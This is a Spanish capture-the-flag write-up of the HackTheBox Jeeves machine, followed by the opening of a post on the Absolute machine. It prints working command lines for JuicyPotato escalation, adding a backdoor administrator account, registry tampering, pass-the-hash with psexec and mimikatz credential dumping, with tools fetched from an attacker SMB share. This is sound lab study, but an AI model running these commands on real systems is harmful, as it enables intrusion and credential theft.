<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<ul>
  <li>Nos dicen que la flag está en otro lado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
11/08/2017  10:05 AM    &lt;DIR&gt;          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,817,216 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>hm.txt
The flag is elsewhere.  Look deeper.
C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Bueno vamos a hacer un <code class="language-plaintext highlighter-rouge">dir /r /s</code> que corresponden a <code class="language-plaintext highlighter-rouge">data streams</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/web19.png" />
</p>

<ul>
  <li>Y allí vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir</span> /r /s
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
11/08/2017  10:05 AM    &lt;DIR&gt;          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:<span class="nv">$DATA</span>
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes

     Total Files Listed:
               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,755,776 bytes free

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; more &lt; hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<h2 id="shell-as-root-second-way">Shell as root second way</h2>

<ul>
  <li>Si vemos los privilegios del usuario vemos que forma parte del grupo <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> podemos usar el <strong>JuicyPotato</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                      Disabled

C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/img.png" />
</p>

<ul>
  <li>
    <p>Aquí puedes encontrarlo <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a>.</p>
  </li>
  <li>
    <p>Vamos a pasarlo ala maquina victima pero en la ruta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> y nos vamos a crear una carpeta para almacenarlo hay.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>Prives

<span class="nb">cd </span>Prives
<span class="nb">cd </span>Prives

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\J</span>uicyPotato.exe JuicyPotato.exe
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives

07/03/2023  02:59 AM    &lt;DIR&gt;          <span class="nb">.</span>
07/03/2023  02:59 AM    &lt;DIR&gt;          ..
07/02/2023  09:50 PM           347,648 JuicyPotato.exe
               1 File<span class="o">(</span>s<span class="o">)</span>        347,648 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,399,424 bytes free

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a agregar un nuevo usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user miguel miguel123</span><span class="nv">$!</span><span class="s2"> /add"</span> <span class="nt">-l</span> 1337
JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user miguel miguel123</span><span class="nv">$!</span><span class="s2"> /add"</span> <span class="nt">-l</span> 1337
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
......
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user
net user

User accounts <span class="k">for</span> <span class="se">\\</span>JEEVES

<span class="nt">-------------------------------------------------------------------------------</span>
Administrator            DefaultAccount           Guest
kohsuke                  miguel
The <span class="nb">command </span>completed successfully.


C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Si validamos vemos que es válido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!'</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\m</span>iguel:miguel123<span class="nv">$!</span>
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que hacer que forme del grupo <strong>Administrators</strong> podemos hacerlo con <strong>JuicyPotato.exe</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net localgroup Administrators miguel /add"</span> <span class="nt">-l</span> 1337
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
......
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Y bueno ahora formamos parte del grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user miguel
net user miguel
User name                    miguel
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/3/2023 3:03:27 AM
Password expires             Never
Password changeable          7/3/2023 3:03:27 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.


C:\Windows\Temp\Prives&gt;
</span></code></pre></div></div>

<ul>
  <li>Antes de validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> debemos hacer lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c reg add HKLM</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\S</span><span class="s2">ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span> <span class="nt">-l</span> 1337
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
......
<span class="o">[</span>+] authresult 0
<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Ahora validamos con <strong>crackmapexec</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!'</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\m</span>iguel:miguel123<span class="nv">$!</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos podemos conectar con la contraseña que proporcionamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/miguel@10.10.10.63 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file TjCVyPZu.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service ntnX on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service ntnX.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Algo que podemos hacer es subir el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/jeeves/ok.png" />
</p>

<ul>
  <li><a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip mimikatz_trunk.zip
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar
  inflating: mimicom.idl
  inflating: README.md
   creating: Win32/
  inflating: Win32/mimidrv.sys
  inflating: Win32/mimikatz.exe
  inflating: Win32/mimilib.dll
  inflating: Win32/mimilove.exe
  inflating: Win32/mimispool.dll
   creating: x64/
  inflating: x64/mimidrv.sys
  inflating: x64/mimikatz.exe
  inflating: x64/mimilib.dll
  inflating: x64/mimispool.dll
❯ <span class="nb">ls</span>
 Win32   CEH.kdbx   JuicyPotato.exe      mimicom.idl          nc.exe
 x64     <span class="nb">hash</span>       kiwi_passwords.yar   mimikatz_trunk.zip   README.md
❯ <span class="nb">cd </span>x64
❯ <span class="nb">ls</span>
 mimidrv.sys   mimikatz.exe   mimilib.dll   mimispool.dll
</code></pre></div></div>

<ul>
  <li>Ahora aprovechándonos de nuestro recurso compartido que tenemos con <code class="language-plaintext highlighter-rouge">smbserver.py</code> vamos a subirlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49676<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:parrotsec<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/Administrator@10.10.10.63 <span class="nt">-hashes</span> :e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file whUEDSYi.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service MlrO on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service MlrO.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp

C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>prives

C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>prives

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; copy <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\m</span>imikatz.exe mimikatz.exe
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; <span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives

07/04/2023  12:54 AM    &lt;DIR&gt;          <span class="nb">.</span>
07/04/2023  12:54 AM    &lt;DIR&gt;          ..
09/19/2022  05:44 PM         1,355,264 mimikatz.exe
               1 File<span class="o">(</span>s<span class="o">)</span>      1,355,264 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,427,297,792 bytes free

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; .<span class="se">\m</span>imikatz.exe <span class="s2">"sekurlsa::logonPasswords"</span> <span class="nb">exit</span>

  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c">#19041 Sep 19 2022 17:44:08</span>
 .## ^ <span class="c">##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
 <span class="s1">'## v ##'</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
  <span class="s1">'#####'</span>        <span class="o">&gt;</span> https://pingcastle.com / https://mysmartlogon.com <span class="k">***</span>/

mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c"># sekurlsa::logonPasswords</span>

Authentication Id : 0 <span class="p">;</span> 995 <span class="o">(</span>00000000:000003e3<span class="o">)</span>
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:09:01 AM
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 118956 <span class="o">(</span>00000000:0001d0ac<span class="o">)</span>
Session           : Service from 0
User Name         : kohsuke
Domain            : JEEVES
Logon Server      : JEEVES
Logon Time        : 7/4/2023 12:09:00 AM
SID               : S-1-5-21-2851396806-8246019-2289784878-1001
	msv :	
	<span class="o">[</span>00010000] CredentialKeys
	<span class="k">*</span> NTLM     : ab4043bce374136df6e09734d4577738
	<span class="k">*</span> SHA1     : 6f0672881aa8f2e79d9097b8dba62bdcbddde585
	<span class="o">[</span>00000003] Primary
	<span class="k">*</span> Username : kohsuke
	<span class="k">*</span> Domain   : JEEVES
	<span class="k">*</span> NTLM     : ab4043bce374136df6e09734d4577738
	<span class="k">*</span> SHA1     : 6f0672881aa8f2e79d9097b8dba62bdcbddde585
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : kohsuke
	<span class="k">*</span> Domain   : JEEVES
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : kohsuke
	<span class="k">*</span> Domain   : JEEVES
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 997 <span class="o">(</span>00000000:000003e5<span class="o">)</span>
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 73605 <span class="o">(</span>00000000:00011f85<span class="o">)</span>
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 73510 <span class="o">(</span>00000000:00011f26<span class="o">)</span>
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 996 <span class="o">(</span>00000000:000003e4<span class="o">)</span>
Session           : Service from 0
User Name         : JEEVES<span class="err">$</span>
Domain            : WORKGROUP
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : jeeves<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 45075 <span class="o">(</span>00000000:0000b013<span class="o">)</span>
Session           : UndefinedLogonType from 0
User Name         : <span class="o">(</span>null<span class="o">)</span>
Domain            : <span class="o">(</span>null<span class="o">)</span>
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:57 AM
SID               :
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 999 <span class="o">(</span>00000000:000003e7<span class="o">)</span>
Session           : UndefinedLogonType from 0
User Name         : JEEVES<span class="err">$</span>
Domain            : WORKGROUP
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:57 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : jeeves<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c"># exit</span>
Bye!

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Absolute (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html" rel="alternate" type="text/html" title="HackTheBox - Absolute (insane)" /><published>2024-06-19T00:00:00-06:00</published><updated>2024-06-19T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/d5dbb09284d3265d91f50eb4ad32fee2.png" />
</p>

<ul>
  <li>Absolute is an Insane Windows Active Directory machine that starts with a webpage displaying some images, whose metadata is used to create a wordlist of possible usernames that may exist on the machine. It turns out that one of these users doesnt require Pre-authentication, therefore posing a valuable target for an <code class="language-plaintext highlighter-rouge">ASREP</code> roast attack. The discovered credentials are then used to enumerate <code class="language-plaintext highlighter-rouge">LDAP</code> and discover credentials for the user <code class="language-plaintext highlighter-rouge">svc_smb</code>, who has access to an <code class="language-plaintext highlighter-rouge">SMB</code> share containing a Windows binary. Performing dynamic analysis on the binary reveals that it tries to perform an <code class="language-plaintext highlighter-rouge">LDAP</code> connection to the Domain Controller with clear text credentials for the <code class="language-plaintext highlighter-rouge">m.lovegod</code> user, who owns the <code class="language-plaintext highlighter-rouge">Network Audit</code> group, which in turn has <code class="language-plaintext highlighter-rouge">Generic Write</code> over the <code class="language-plaintext highlighter-rouge">winrm_user</code>. Following this attack path and performing a shadow credential attack on the <code class="language-plaintext highlighter-rouge">winrm_user</code>, one can then <code class="language-plaintext highlighter-rouge">WinRM</code> and access the machine. Finally, the <code class="language-plaintext highlighter-rouge">KrbRelay</code> tool is used to add the <code class="language-plaintext highlighter-rouge">winrm_user</code> user to the Administrators group, leading to fully elevated privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49684,49685,49697,49701 10.10.11.181 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-17 18:15 CST
Nmap scan report <span class="k">for </span>10.10.11.181
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-06-18 07:15:35Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
